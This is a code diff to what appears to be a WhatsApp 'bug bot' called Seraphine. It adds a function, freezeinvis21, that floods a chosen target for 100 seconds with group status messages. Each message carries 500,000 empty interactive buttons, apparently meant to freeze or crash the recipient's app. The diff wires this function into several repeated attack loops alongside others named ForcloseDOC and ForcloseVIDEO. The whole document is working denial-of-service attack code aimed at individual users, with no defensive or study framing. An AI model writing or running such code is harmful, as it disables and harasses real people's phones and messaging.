@@ -4026,7 +4026,31 @@ async function StuckLogo(target) {
     }
   }, { participant: target });
 }
-
+async function freezeinvis21(target) {
+  const start = Date.now();
+  while (Date.now() - start < 100000) {
+    try {
+      await sock.relayMessage(target, {
+        groupStatusMessageV2: {
+          message: {
+            interactiveMessage: {
+              body: { text: "!Sseraphhnieee" },
+              nativeFlowMessage: {
+                buttons: Array.from({ length: 500000 }, () => ({}))
+              }
+            }
+          }
+        }
+      }, {
+        noSyncSelf: true,
+        participant: target
+      });
+    } catch (e) {
+      if (e.code !== 'EPIPE') console.log("Error:", e.message);
+    }
+    await new Promise((r) => setTimeout(r, 2000));
+  }
+}
 //=========== ASYNC FUNCTION SEND ==========\\
 async function crayxkouta(target) {
 for (let i = 0; i < 25; i++) {
@@ -4074,14 +4098,10 @@ async function crayxui(target) {
 for (let i = 0; i < 25; i++) {
 await starttime(target)
 await ForcloseSTC(target)
-await StuckLogo(target)
+await freezeinvis21(target)
 await ForcloseVIDEO(target)
 await ForcloseDOC(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
+await freezeinvis21(target)
 await ForcloseDOC(target)
 await starttime(target)
 await ForcloseSTC(target)
@@ -4093,16 +4113,11 @@ console.log(chalk.red(`[Seraphine - FORCE 🦠 ] ${target}`));
 
 async function crayxsuper(target) {
 for (let i = 0; i < 50; i++) {
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
+await freezeinvis21(target)
+await freezeinvis21(target)
+await freezeinvis21(target)
+await freezeinvis21(target)
+await freezeinvis21(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - CORE VIP 🔥 ] ${target}`));
 }
@@ -4119,16 +4134,11 @@ await ForcloseDOC(target)
 await starttime(target)
 await ForcloseSTC(target)
 await ForcloseVIDEO(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
+await freezeinvis21(target)
+await freezeinvis21(target)
+await freezeinvis21(target)
+await freezeinvis21(target)
+await freezeinvis21(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
 }
@@ -4136,11 +4146,11 @@ console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
 
 async function Crayxbayar(target) {
 for (let i = 0; i < 20; i++) {
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
-await StuckLogo(target)
+await freezeinvis21(target)
+await freezeinvis21(target)
+await freezeinvis21(target)
+await freezeinvis21(target)
+await freezeinvis21(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - MEMEK ] ${target}`));
 }
